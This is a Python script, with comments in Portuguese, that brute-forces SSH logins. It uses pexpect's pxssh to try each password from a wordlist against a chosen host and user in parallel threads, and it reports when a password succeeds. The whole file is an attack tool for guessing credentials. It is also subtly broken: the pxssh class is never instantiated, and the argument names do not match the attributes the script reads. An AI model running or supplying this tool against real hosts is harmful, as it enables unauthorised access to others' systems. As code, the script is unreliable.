from pexpect import pxssh
from threading import *
import argparse
import time

max_connections = 5
connection_lock = BoundedSemaphore(value=max_connections)
found = False
fails = 0


def send_command(s, cmd):
    s.sendline(cmd)
    s.prompt()
    print(s.before)


# conectando na linha de comando, e caso alguma exceção ocorra, vai esperar 5 ou 1 seg antes de executar novamente
def connect(host, user, password, release):
    global found
    global fails
    try:
        s = pxssh.pxssh
        s.login(host, user, password)
        print('[+] Password found: ' + password)
        found = True
    except Exception as e:
        if 'read non_blocking' in str(e):
            fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()


# fazendo a interação com a linha de comando e chamando as funções caso o preenchimento esteja correto
def main():
    parser = argparse.ArgumentParser(prog='pxssh', usage='PROG -H <target host> -u <target user> -f <password list>')
    parser.add_argument('-H', dest='--tgt_host', type=str, help='specify target host')
    parser.add_argument('-u', dest='--tgt_user', type=str, help='specify target user')
    parser.add_argument('-f', dest='--pwrd_list', type=str, help='specify password list')
    args = parser.parse_args()

    tgt_host = args.tgt_host
    tgt_user = args.tgt_user
    pwrd_list = args.pwrd_list

    if (tgt_host is None) | (tgt_user is None) | (pwrd_list is None):
        print(parser.usage)
        exit(0)

    fn = open(pwrd_list, 'r')

    for line in fn.readlines():
        if found:
            print('[*] Password found')
            exit(0)
        if fails > 5:
            print('Exiting, too many sockets timeouts!')
            exit(0)

        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print('Testing: ' + password)
        t = Thread(target=connect, args=(tgt_host, tgt_user, password, True))
        t.start()


if __name__ == '__main__':
    main()
